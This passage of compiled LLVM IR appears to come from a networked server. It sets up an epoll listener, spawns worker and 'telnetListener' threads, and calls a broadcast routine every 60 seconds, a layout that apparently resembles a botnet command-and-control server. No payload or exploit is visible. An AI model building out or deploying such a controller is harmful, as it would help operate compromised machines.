  unreachable

42:                                               ; preds = %23
  %43 = load volatile i32, i32* @listenFD, align 4
  %44 = call i32 @make_socket_non_blocking(i32 %43)
  store i32 %44, i32* %8, align 4
  %45 = load i32, i32* %8, align 4
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @abort() #11
  unreachable

48:                                               ; preds = %42
  %49 = load volatile i32, i32* @listenFD, align 4
  %50 = call i32 @listen(i32 %49, i32 4096) #9
  store i32 %50, i32* %8, align 4
  %51 = load i32, i32* %8, align 4
  %52 = icmp eq i32 %51, -1
  br i1 %52, label %53, label %54

53:                                               ; preds = %48
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.145, i64 0, i64 0))
  call void @abort() #11
  unreachable

54:                                               ; preds = %48
  %55 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %55, i32* @epollFD, align 4
  %56 = load volatile i32, i32* @epollFD, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

58:                                               ; preds = %54
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.146, i64 0, i64 0))
  call void @abort() #11
  unreachable

59:                                               ; preds = %54
  %60 = load volatile i32, i32* @listenFD, align 4
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %62 = bitcast %union.epoll_data* %61 to i32*
  store i32 %60, i32* %62, align 1
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %63, align 1
  %64 = load volatile i32, i32* @epollFD, align 4
  %65 = load volatile i32, i32* @listenFD, align 4
  %66 = call i32 @epoll_ctl(i32 %64, i32 1, i32 %65, %struct.epoll_event* %11) #9
  store i32 %66, i32* %8, align 4
  %67 = load i32, i32* %8, align 4
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %70

69:                                               ; preds = %59
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.12, i64 0, i64 0))
  call void @abort() #11
  unreachable

70:                                               ; preds = %59
  %71 = load i32, i32* %9, align 4
  %72 = add nsw i32 %71, 2
  %73 = zext i32 %72 to i64
  %74 = call i8* @llvm.stacksave()
  store i8* %74, i8** %12, align 8
  %75 = alloca i64, i64 %73, align 16
  store i64 %73, i64* %13, align 8
  br label %76

76:                                               ; preds = %80, %70
  %77 = load i32, i32* %9, align 4
  %78 = add nsw i32 %77, -1
  store i32 %78, i32* %9, align 4
  %79 = icmp ne i32 %77, 0
  br i1 %79, label %80, label %86

80:                                               ; preds = %76
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 2
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i64, i64* %75, i64 %83
  %85 = call i32 @pthread_create(i64* %84, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #9
  br label %76, !llvm.loop !20

86:                                               ; preds = %76
  %87 = getelementptr inbounds i64, i64* %75, i64 0
  %88 = load i32, i32* %10, align 4
  %89 = sext i32 %88 to i64
  %90 = inttoptr i64 %89 to i8*
  %91 = call i32 @pthread_create(i64* %87, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %90) #9
  br label %92

92:                                               ; preds = %93, %86
  br label %93

93:                                               ; preds = %92
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.147, i64 0, i64 0))
  %94 = call i32 @sleep(i32 60)
  br label %92
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.149, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.150, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !21

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.151, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
